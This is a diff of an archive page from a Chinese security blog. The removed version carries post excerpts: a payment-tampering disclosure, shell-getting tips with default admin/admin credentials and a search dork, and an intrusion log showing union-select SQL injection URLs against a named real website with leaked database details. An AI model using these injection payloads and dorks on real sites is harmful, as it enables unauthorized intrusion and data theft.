@@ -1,275 +1,274 @@
-<!DOCTYPE html>
-<html>
 
+  <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Archives: 2012 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Archives: 2012 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Archives: 2012 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+    <body>
+      <header>
+        <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+      </header>
+      <div id="container">
+        
 
-      
-<main class="content" role="main">
+<div class="archive-title" >
+  <h2 class="archive-icon">2012</h2>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-07-02T07:59:05.000Z" itemprop="datePublished">
-          2012-07-02
-      </time>
-    
-    
-    | 
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/post/'>post</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/619.seo/">淘宝网某处存在严重支付漏洞</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>转自乌云<a href="http://www.wooyun.org/bugs/wooyun-2010-07293">http://www.wooyun.org/bugs/wooyun-2010-07293</a></p>  <p>漏洞详情</p>  <p>披露状态：</p>  <p>2012-05-18： 细节已通知厂商并且等待厂商处理中   <br />2012-05-18： 厂商已经确认，细节仅向厂商公开    <br />2012-05-28： 细节向核心白帽子及相关领域专家公开    <br />2012-06-07： 细节向普通白帽子公开    <br />2012-06-17： 细节向实习白帽子公开    <br />2012-07-02： 细节向公众公开</p>  <p>简要描述：</p>  <p>淘宝网某处存在支付漏洞，未使用SSL加密支付过程，同时，对支付过程相关代码的审计存在一定缺陷，导致漏洞产生。会导致允许用户对支付金额进行修改，给厂商带来很大的利益损失。</p>  <p>详细说明：</p>  <p>在阿里旺旺2012中，使用短信旺旺中心对短信条数进行充值，在该过程中，未使用SSL安全连接，同时存在支付漏洞。   <br />选择充值的金额后，下一步，使用<a href="http://ha.cker.in/tag/Fiddler" target="_blank">Fiddler</a>截取数据包，GBK编码，修改POST数据中的数据，seriesPrice为支付的金额，seriesNum为充值的条数，这两个地方理论上都可以进行修改，这里以修改seriesPrice为例。</p>  <p>漏洞证明：</p>  <p>充值前截图</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/bdc6a26da239_15137/clip_image001.jpg" width="532" height="443" /></p>
-      
-      </p>
-      
-      <p>
-          <a href="/619.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+  <div class="archiveslist archive-float clearfix">
+   <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">2016年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">2016年04月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">2016年01月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">2015年10月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">2015年09月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">2015年07月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">2015年06月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">2015年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">2015年04月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">2015年03月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">2015年01月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">2014年12月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">2014年10月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">2014年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">2014年08月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">2014年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/06/">2014年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/05/">2014年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">2014年04月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">2014年03月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02/">2014年02月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">2014年01月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">2013年12月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">2013年11月</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/10/">2013年10月</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/09/">2013年09月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/08/">2013年08月</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">2013年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/06/">2013年06月</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">2013年05月</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/04/">2013年04月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">2013年03月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/02/">2013年02月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">2013年01月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">2012年12月</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">2012年11月</a><span class="archive-list-count">28</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">2012年10月</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/09/">2012年09月</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/08/">2012年08月</a><span class="archive-list-count">17</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">2012年07月</a><span class="archive-list-count">26</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">2012年06月</a><span class="archive-list-count">58</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/05/">2012年05月</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">2012年04月</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/03/">2012年03月</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/02/">2012年02月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/01/">2012年01月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">2011年12月</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/11/">2011年11月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/10/">2011年10月</a><span class="archive-list-count">21</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/09/">2011年09月</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/08/">2011年08月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">2011年07月</a><span class="archive-list-count">17</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">2011年06月</a><span class="archive-list-count">7</span></li></ul>
+ </div>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-07-02T06:06:45.000Z" itemprop="datePublished">
-          2012-07-02
-      </time>
-    
-    
-    | 
-    <a href='/tag/拿shell/'>拿shell</a>,
-    
-    <a href='/tag/突破星外/'>突破星外</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/616.seo/">关于后台只读备份拿shell</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>今天在旁注一个站点的过程中遇到了一个十分有意思的站,拿出来跟大家分享下.&#160; 小菜文章没技术含量大牛路过    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; margin-left: 0px; border-top: 0px; margin-right: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/shell_14827/clip_image001.jpg" width="590" height="364" />这是这个站的后台用 账号admin密码admin进去以后发现里面是精良的框架搭建的</p>
-      
-      </p>
-      
-      <p>
-          <a href="/616.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+</div>
+<div id="main" class="archive-part clearfix">
+  <div id="archive-page">
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-28T07:52:56.000Z" itemprop="datePublished">
-          2012-06-28
-      </time>
-    
-    
-    | 
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/sinopass/'>sinopass</a>,
-    
-    <a href='/tag/后台/'>后台</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/614.seo/">sinopass后台管理系统漏洞</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        无意中发现：   关键词：inurl:About.asp?i_type=   自己尝试了一下&#160; 基本上都是的   后台：admin/login.asp&#160; 或者manage   拿shell方法:数据库备份&#160; 或者ewebeditor   有ewebeditor默认路径&#160; 默认数据库的&#160; 后台帐号密码可以注入&#160; 注入漏洞蛮多的 添加字段 a_name a_pass
-      
-      </p>
-      
-      <p>
-          <a href="/614.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/619.seo/" title="淘宝网某处存在严重支付漏洞" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-28T07:48:16.000Z" itemprop="datePublished">
-          2012-06-28
-      </time>
+    <h1 itemprop="name">淘宝网某处存在严重支付漏洞</h1>
     
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/611.seo/">记新手的一次渗透入侵</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><table border="0" cellspacing="0" cellpadding="0"><tbody>     <tr>       <td>         <p>一年前把，<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a><b></b>了，这次发现不是root，但帐户支持load_file()            <br />Ps：我严重鄙视挂马的人，还有那些黑心贩子。。。            <br />Ps：我从一开始写文章到现在，不屏蔽<b>渗透</b>的地址连接，主要的原因还是希望            <br />大家可以通过我的文章，真正实践性滴学习本文内容，新人朋友可以一步步滴实践操作            <br />【懒得扯淡了，希望大家那个什么什么什么，你们懂的，人品很重要】            <br /><a href="http://www.czxtaiji.net/content.php?theMenuId=4&amp;theSubMenuId=1&amp;theArticleId=48%20and%201=2">http://www.czxtaiji.net/content. … leId=48%20and%201=2</a>            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 947            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 948            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 949            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 950            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 951            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 952            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 953            <br />获取到路径：d:\czxsite\bin\sys\config.php            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/0a82505b9f50_14E77/clip_image002.jpg" width="604" height="316" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=48 order by 9            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/0a82505b9f50_14E77/clip_image004.jpg" width="604" height="240" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,5,6,7,8,9            <br />Warning: disparticlecontent(7): failed to open stream: No such file or directory in d:\czxsite\bin\sys\config.php on line 976            <br />Warning: disparticlecontent(): Failed opening ‘7’ for inclusion (include_path=’.;c:\php4\pear’) in d:\czxsite\bin\sys\config.php on line 976            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,user(),database(),7,8,version()            <br />user():czxtaiji@localhost            <br />version():4.0.18-nt&#160;&#160; <br />database():czxtaiji            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/0a82505b9f50_14E77/clip_image006.jpg" width="604" height="237" /></p>       </td>     </tr>   </tbody></table>
-      
-      </p>
-      
-      <p>
-          <a href="/611.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-07-02T07:59:05.000Z" itemprop="datePublished">2012-07-02</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-28T07:38:55.000Z" itemprop="datePublished">
-          2012-06-28
-      </time>
-    
-    
-    | 
-    <a href='/tag/网络安全/'>网络安全</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/609.seo/">某大型企业局域网安全解决方案</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>第一章 总则 </p>  <p>本方案为某大型局域网<a href="http://ha.cker.in/tag/网络安全" target="_blank">网络安全</a>解决方案，包括原有网络系统分析、安全需求分析、安全目标的确立、安全体系结构的设计、等。本安全解决方案的目标是在不影响某大型企业局域网当前业务的前提下，实现对他们局域网全面的安全管理。 </p>  <p>1.将安全策略、硬件及软件等方法结合起来，构成一个统一的防御系统，有效阻止非法用户进入网络，减少网络的安全风险。    <br />2.定期进行漏洞扫描，审计跟踪，及时发现问题，解决问题。     <br />3.通过入侵检测等方式实现实时安全监控，提供快速响应故障的手段，同时具备很好的安全取证措施。     <br />4.使网络管理者能够很快重新组织被破坏了的文件或应用。使系统重新恢复到破坏前的状态，最大限度地减少损失。     <br />5.在工作站、服务器上安装相应的防病毒软件，由中央控制台统一控制和管理，实现全网统一防病毒。 </p>  <p>第二章 网络系统概况 </p>  <p>2.1 、网络概况    <br />这个企业的局域网是一个信息点较为密集的千兆局域网络系统，它所联接的现有上千个信息点为在整个企业内办公的各部门提供了一个快速、方便的信息交流平台。不仅如此，通过专线与Internet的连接，打通了一扇通向外部世界的窗户，各个部门可以直接与互联网用户进行交流、查询资料等。通过公开服务器，企业可以直接对外发布信息或者发送电子邮件。高速交换技术的采用、灵活的网络互连方案设计为用户提供快速、方便、灵活通信平台的同时，也为网络的安全带来了更大的风险。因此，在原有网络上实施一套完整、可操作的安全解决方案不仅是可行的，而且是必需的。 </p>  <p>2.1.1 、网络概述 </p>  <p>这个企业的局域网，物理跨度不大，通过千兆交换机在主干网络上提供1000M的独享带宽，通过下级交换机与各部门的工作站和服务器连结，并为之提供100M的独享带宽。利用与中心交换机连结的Cisco 路由器，所有用户可直接访问Internet。 </p>  <p>2.1.2 、网络结构 </p>  <p>这个企业的局域网按访问区域可以划分为三个主要的区域：Internet区域、内部网络、公开服务器区域。内部网络又可按照所属的部门、职能、安全重要程度分为许多子网，包括：财务子网、领导子网、办公子网、市场部子网、中心服务器子网等。在安全方案设计中，我们基于安全的重要程度和要保护的对象，可以在Catalyst 型交换机上直接划分四个虚拟局域网（VLAN），即：中心服务器子网、财务子网、领导子网、其他子网。不同的局域网分属不同的广播域，由于财务子网、领导子网、中心服务器子网属于重要网段，因此在中心交换机上将这些网段各自划分为一个独立的广播域，而将其他的工作站划分在一个相同的网段。（图省略） </p>
-      
-      </p>
-      
-      <p>
-          <a href="/609.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/616.seo/" title="关于后台只读备份拿shell" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-25T06:39:29.000Z" itemprop="datePublished">
-          2012-06-25
-      </time>
+    <h1 itemprop="name">关于后台只读备份拿shell</h1>
     
-    
-    | 
-    <a href='/tag/xss/'>xss</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/603.seo/">xss的发现与利用</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>xss老生常谈了xss的发现也是有一些技巧的，这里介绍一种。   <br />很多人习惯是直接输入一些特殊字符进行判断，其实吧，在你发送的时候抓一下包看下会有惊喜哦！    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/xss_13E92/clip_image002.jpg" width="604" height="460" /> </p>
-      
-      </p>
-      
-      <p>
-          <a href="/603.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-07-02T06:06:45.000Z" itemprop="datePublished">2012-07-02</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <nav class="pagination" role="pagination">
-    <a class="newer-posts" href="/archives/2012/page/21/">← Newer Posts</a>
-    <span class="page-number">Page 22 of 40</span>
-    <a class="older-posts" href="/archives/2012/page/23/">Older Posts →</a>
+    <a href="/614.seo/" title="sinopass后台管理系统漏洞" itemprop="url">
+  
+    <h1 itemprop="name">sinopass后台管理系统漏洞</h1>
+    
+    <time datetime="2012-06-28T07:52:56.000Z" itemprop="datePublished">2012-06-28</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/611.seo/" title="记新手的一次渗透入侵" itemprop="url">
+  
+    <h1 itemprop="name">记新手的一次渗透入侵</h1>
+    
+    <time datetime="2012-06-28T07:48:16.000Z" itemprop="datePublished">2012-06-28</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/609.seo/" title="某大型企业局域网安全解决方案" itemprop="url">
+  
+    <h1 itemprop="name">某大型企业局域网安全解决方案</h1>
+    
+    <time datetime="2012-06-28T07:38:55.000Z" itemprop="datePublished">2012-06-28</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/603.seo/" title="xss的发现与利用" itemprop="url">
+  
+    <h1 itemprop="name">xss的发现与利用</h1>
+    
+    <time datetime="2012-06-25T06:39:29.000Z" itemprop="datePublished">2012-06-25</time>
+  </a>
+</section>
+
+
+  <nav id="page-nav" class="clearfix archive-nav">
+    <a class="extend prev" rel="prev" href="/archives/2012/page/21/">&laquo; 上一页</a><a class="page-number" href="/archives/2012/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/2012/page/20/">20</a><a class="page-number" href="/archives/2012/page/21/">21</a><span class="page-number current">22</span><a class="page-number" href="/archives/2012/page/23/">23</a><a class="page-number" href="/archives/2012/page/24/">24</a><span class="space">&hellip;</span><a class="page-number" href="/archives/2012/page/40/">40</a><a class="extend next" rel="next" href="/archives/2012/page/23/">下一页 &raquo;</a>
   </nav>
-</main>
 
-
-      
-<footer class="site-footer">
-  
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
+</div>
+
+      </div>
+      <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+      <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+    </body>
+   </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
